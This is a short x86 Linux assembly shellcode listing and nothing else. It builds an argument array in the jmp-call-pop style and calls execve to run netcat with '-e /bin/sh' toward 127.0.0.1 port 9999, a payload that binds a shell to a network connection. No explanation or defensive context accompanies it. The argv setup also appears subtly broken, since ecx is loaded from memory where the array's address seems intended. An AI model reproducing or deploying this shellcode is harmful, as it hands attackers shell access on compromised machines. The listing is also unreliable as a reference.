[SECTION .text]
global _start
_start:
jmp short ender
second:
xor eax, eax
pop esi
mov byte [esi + 11], al 
mov byte [esi + 14], al
mov byte [esi + 22], al
mov byte [esi + 32], al
mov byte [esi + 37], al
mov long [esi + 38], esi
lea ebx, [esi + 12]
mov long [esi + 42], ebx 
lea ebx, [esi + 15]
mov long [esi + 46], ebx 
lea ebx, [esi + 23] 
mov long [esi + 50], ebx
lea ebx, [esi + 33]
mov long [esi + 54], ebx
xor eax, eax
mov long [esi + 58], eax
mov byte al, 0x0b 
mov ebx, esi
mov ecx, [esi + 38] 
mov edx, [esi + 58] 
int 0x80 
ender:
call second
db "/bin/netcat#-e#/bin/sh#127.0.0.1#9999#AAAABBBBCCCCDDDDEEEEFFFF"
